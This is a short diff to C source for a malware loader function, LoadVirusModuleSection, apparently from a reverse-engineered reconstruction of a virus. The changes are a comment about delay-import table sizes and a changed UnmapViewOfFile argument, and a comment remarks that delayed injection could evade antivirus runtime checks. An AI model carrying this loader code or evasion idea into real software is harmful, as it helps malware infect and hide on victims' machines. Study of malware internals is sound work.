@@ -57,7 +57,8 @@ INT32 LoadVirusModuleSection(HANDLE hHandle, PGENERAL_INFO_BLOCK sInfoBlock, PVO
 
 		// According to the below references, each entry in the delay import table is 32 bits
 		//  so what the actual fuck is going on here. I suppose delayed injection would be a good way
-		//  of dodging an AV's runtime check, as the virus is loaded into memory as-needed
+		//  of dodging an AV's runtime check, as the virus is loaded into memory as-needed.
+		// Still wouldn't explain why we're subtracting 8 from the Size
 		// https://msdn.microsoft.com/en-us/library/windows/desktop/ms680305(v=vs.85).aspx
 		// http://svn.wildfiregames.com/docs/structImgDelayDescr.html
 		if(pImageNT->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT].Size == 72)
@@ -71,7 +72,7 @@ INT32 LoadVirusModuleSection(HANDLE hHandle, PGENERAL_INFO_BLOCK sInfoBlock, PVO
 
 	*pOutSection = pBaseAddr;
 
-	g_hardAddrs.UnmapViewOfFile(sVirusModuleBlocksHeader); // Unmap pCurrAddr -> same copy present in pBaseAddr
+	g_hardAddrs.UnmapViewOfFile(pBaseAddr); // Also unmaps sVirusModuleBlocks header
 	g_hardAddrs.ZwClose(hMapHandle);
 
 	return 0;
